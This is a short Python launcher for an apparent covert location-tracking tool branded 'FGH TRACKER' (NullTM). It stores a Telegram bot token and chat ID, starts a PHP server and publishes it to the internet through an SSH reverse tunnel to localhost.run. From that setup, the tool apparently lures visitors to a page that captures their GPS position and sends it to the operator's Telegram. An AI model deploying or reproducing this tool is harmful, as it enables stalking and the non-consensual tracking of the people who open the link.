#/usr/bin/env python3
# code by Aryan Chehreghani
# TRACKER 
# t.me/NullTM

import os
os.system("clear")
print(''' \033[92m
                 '&&&&&&&'
                '&&&&&&&&&'
               '&&&&&&&&&&&'
               "&&&'   '&&&"
              "&&&&,   ,&&&&"    GPS : FGH TRACKER 
              "&&&&&&&&&&&&&"    --------------------
               "&&&&&&&&&&&"     t.me/NullTM
                "&&&&&&&&&"
                 "&&&&&&&"   @NullTM
                  "&&&&&"
                   "&&&"
                    "&"  \033[95m
    #####################################

''')
open('bot-data.txt', 'w').close()
token = input("Enter The Bot Token: ")
chat_id = input("Enter The Your Chat ID: ")
f = open("bot-data.txt", "a")
f.write(token+"$"+chat_id)
f.close()
os.system("php -S localhost:8080 | ssh -R 80:localhost:8080 ssh.localhost.run")


